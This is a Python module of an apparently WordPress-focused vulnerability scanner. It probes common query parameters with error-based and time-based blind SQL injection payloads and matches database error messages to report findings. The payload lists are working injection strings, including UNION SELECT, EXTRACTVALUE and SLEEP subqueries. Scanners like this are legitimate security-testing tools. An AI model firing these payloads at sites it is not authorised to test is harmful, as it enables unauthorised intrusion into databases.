"""SQL Injection scanner — error-based + time-based blind across WP params."""

from __future__ import annotations

import time
from typing import TYPE_CHECKING
from urllib.parse import quote

import httpx

from core.models import Evidence, Finding, Severity, Confidence, FindingType, Compliance
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession

SQLI_PARAMS = ["s", "p", "cat", "author", "paged", "id", "page_id", "orderby"]

# Error-based payloads — safe to send in any profile
ERROR_PAYLOADS = [
    ("'", "single quote"),
    ('"', "double quote"),
    ("' OR '1'='1", "boolean OR"),
    ("1 UNION SELECT NULL--", "union select"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "error-based extractvalue"),
]

# Time-based payloads — intrusive, only for aggressive/bugbounty profiles
TIME_PAYLOADS = [
    ("' AND SLEEP(5)--", "time-based SLEEP"),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "time-based subquery SLEEP"),
]

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "supplied argument is not a valid mysql",
    "ora-00",
    "ora-01",
    "microsoft ole db",
    "microsoft sql server",
    "unrecognized token",
    "pg_query",
    "pg_exec",
    "sqlite3.operationalerror",
    "sql syntax",
    "wpdb",
]

MAX_REQUESTS = 60
TIME_THRESHOLD = 4.5  # seconds for SLEEP(5) confirmation
BASELINE_MAX = 2.0    # baseline must be quick to trust the time-based delta


class SQLiScannerModule(BazookaModule):
    name = "vuln.sqli_scanner"
    phase = "vuln"
    description = "SQL Injection scanner (error-based + time-based blind)"
    profiles = ["standard", "aggressive"]

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url
        vulnerable_params: set[str] = set()
        request_count = 0
        finding_idx = 1

        intrusive_ok = ctx.profile in ("aggressive", "bugbounty")

        # Baseline timing: a benign request to compare time-based deltas against
        baseline_time = 1.0
        try:
            t0 = time.time()
            await session.get(f"{base}/?s=bazooka_baseline_test", use_cache=False)
            baseline_time = time.time() - t0
            request_count += 1
        except (httpx.TimeoutException, httpx.ConnectError, httpx.HTTPError):
            baseline_time = 1.0

        for param in SQLI_PARAMS:
            if param in vulnerable_params:
                continue
            if request_count >= MAX_REQUESTS:
                break

            # --- Error-based pass ---
            for payload, payload_name in ERROR_PAYLOADS:
                if request_count >= MAX_REQUESTS:
                    break
                request_count += 1
                url = f"{base}/?{param}={quote(payload, safe='')}"
                try:
                    resp = await session.get(url, use_cache=False)
                except (httpx.TimeoutException, httpx.ConnectError, httpx.HTTPError):
                    continue

                body_lower = (resp.text or "")[:8000].lower()
                matched = next((p for p in SQL_ERROR_PATTERNS if p in body_lower), None)
                if matched:
                    vulnerable_params.add(param)
                    idx = body_lower.index(matched)
                    excerpt = body_lower[idx: idx + 240]
                    result.add_finding(Finding(
                        id=f"VULN-SQLI-{finding_idx:03d}",
                        title=f"SQL Injection error-based dans ?{param}=",
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=Confidence.CONFIRMED,
                        finding_type=FindingType.CVE,
                        description=(
                            f"Erreur SQL revelee par le payload '{payload_name}' sur le parametre "
                            f"'{param}'. Motif detecte: '{matched}'."
                        ),
                        evidence=Evidence(
                            request=f"GET {url}",
                            response_status=resp.status_code,
                            response_body_excerpt=excerpt,
                        ),
                        impact="Lecture/modification/suppression de la base de donnees. Compromission totale.",
                        remediation="Utiliser wpdb::prepare(). Mettre a jour WordPress, themes, plugins.",
                        compliance=Compliance(
                            owasp_2021="A03:2021 - Injection",
                            cwe="CWE-89",
                            mitre_attack="T1190 - Exploit Public-Facing Application",
                        ),
                        phase="vuln",
                        module=self.name,
                        tags=["sqli", "error-based", param],
                    ))
                    finding_idx += 1
                    break  # one finding per param

            if param in vulnerable_params:
                continue

            # --- Time-based pass (only if profile allows it) ---
            if not intrusive_ok:
                continue
            if baseline_time >= BASELINE_MAX:
                # If baseline is already slow, time-based detection is unreliable
                continue

            for payload, payload_name in TIME_PAYLOADS:
                if request_count >= MAX_REQUESTS:
                    break
                request_count += 1
                url = f"{base}/?{param}={quote(payload, safe='')}"
                try:
                    t0 = time.time()
                    resp = await session.get(url, use_cache=False)
                    elapsed = time.time() - t0
                except (httpx.TimeoutException, httpx.ConnectError, httpx.HTTPError):
                    continue

                if elapsed > TIME_THRESHOLD and baseline_time < BASELINE_MAX:
                    vulnerable_params.add(param)
                    result.add_finding(Finding(
                        id=f"VULN-SQLI-{finding_idx:03d}",
                        title=f"SQL Injection time-based blind dans ?{param}=",
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=Confidence.LIKELY,
                        finding_type=FindingType.CVE,
                        description=(
                            f"Delai anormal ({elapsed:.2f}s vs baseline {baseline_time:.2f}s) "
                            f"avec le payload '{payload_name}' sur '{param}'. Time-based blind confirmee."
                        ),
                        evidence=Evidence(
                            request=f"GET {url}",
                            response_status=resp.status_code,
                            response_body_excerpt=(
                                f"elapsed={elapsed:.2f}s baseline={baseline_time:.2f}s "
                                f"threshold={TIME_THRESHOLD}s"
                            ),
                        ),
                        impact="Extraction de donnees via injection blind. Compromission possible.",
                        remediation="Audit du code SQL, wpdb::prepare(), mises a jour.",
                        compliance=Compliance(
                            owasp_2021="A03:2021 - Injection",
                            cwe="CWE-89",
                            mitre_attack="T1190 - Exploit Public-Facing Application",
                        ),
                        phase="vuln",
                        module=self.name,
                        tags=["sqli", "time-based", "blind", param],
                    ))
                    finding_idx += 1
                    break

        if not vulnerable_params:
            result.add_finding(Finding(
                id="VULN-SQLI-CLEAR",
                title="Aucune SQL Injection detectee",
                severity=Severity.INFO,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.INFORMATION_DISCLOSURE,
                description=(
                    f"{len(SQLI_PARAMS)} parametres testes, error-based + "
                    f"{'time-based' if intrusive_ok else 'pas de time-based (profil non-intrusif)'} "
                    f"({request_count} requetes). Aucune injection detectee."
                ),
                phase="vuln",
                module=self.name,
            ))

        result.add_data("sqli_requests", request_count)
        result.add_data("sqli_baseline_time", round(baseline_time, 3))
        result.add_data("sqli_vulnerable_params", sorted(vulnerable_params))
        return result

    def should_run(self, ctx) -> bool:
        return ctx.profile != "bugbounty"
